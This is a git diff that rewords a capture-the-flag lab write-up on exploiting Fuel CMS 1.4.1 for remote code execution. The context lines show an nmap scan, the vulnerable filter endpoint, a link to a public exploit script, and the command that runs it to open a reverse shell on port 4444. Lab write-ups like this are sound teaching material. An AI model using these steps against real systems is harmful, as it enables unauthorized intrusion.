@@ -19,13 +19,13 @@ During this lab, several phases were performed, including **reconnaissance**, **
 
 Initial access was obtained through the vulnerable web application, followed by further enumeration to identify sensitive information. The shell was then stabilized and leveraged to escalate privileges, ultimately achieving **root access**.
 
-The objective of this room is to exploit a known vulnerability in Fuel CMS to gain access to both user-level and root-level information.
+This write-up follows a structured methodology including reconnaissance, enumeration, exploitation, and privilege escalation, with a focus on understanding the reasoning behind each step rather than simply executing commands.
 
 ---
 
 ## 🔎 Reconnaissance
 
-An initial **reconnaissance phase** was performed to identify exposed services and potential entry points into the target machine.
+The first step was to identify open ports and exposed services on the target machine. This helps define the attack surface and determine which services may be vulnerable.
 
 A network scan was conducted using **Nmap** to detect open ports, running services, and system information:
 
@@ -34,15 +34,15 @@ nmap -sV -sS -O 10.129.158.61
 ```
 ![Nmap Scan](images/nmap.png)
 
-The scan results revealed that only **port 80 (HTTP)** was open.
+The scan revealed that port 80 (HTTP) was open, indicating that a web application is running on the target.
 
-Since this was the only exposed service, the focus of the assessment shifted towards analyzing the **web application** as the primary attack surface.
+Since no other significant services were exposed, the web application became the primary focus for further enumeration.
 
 ---
 
 ## 🔍 Enumeration & Vulnerability Analysis
 
-To begin the enumeration phase, the **HTTP service** was accessed through a web browser to analyze the application manually.
+With a web service identified, the next step was to enumerate the application to uncover technologies, hidden endpoints, and potential vulnerabilities.
 
 ![HTTP service](images/HTTP-service.png)
 
@@ -56,9 +56,9 @@ A search for known vulnerabilities affecting this version led to the discovery o
 /fuel/pages/select/?filter=
 ```
 
-Additional research across security advisories and exploit databases confirmed that this vulnerability is publicly known and exploitable.
+Given the presence of Fuel CMS, the next step was to search for publicly known vulnerabilities that could be leveraged for exploitation.
 
-A working exploit was then identified in a public GitHub repository:
+A working exploit was then identified in a public **GitHub** repository:
 
 👉 [Fuel CMS 1.4.1 RCE Exploit](https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated/blob/main/Fuel-Updated.py)
 
@@ -89,7 +89,7 @@ python3 Fuel-Updated.py http://10.130.137.229 10.129.79.84 4444
 ```
 ![Exploit Executed](images/exploit-exec.png)
 
-Once executed, the target system initiated a connection back to the attacker, resulting in a **reverse shell** under the `www-data` user.
+This resulted in a reverse shell, providing initial access to the target system as a low-privileged user.
 
 ![Reverse Shell](images/rev-shell.png)
 
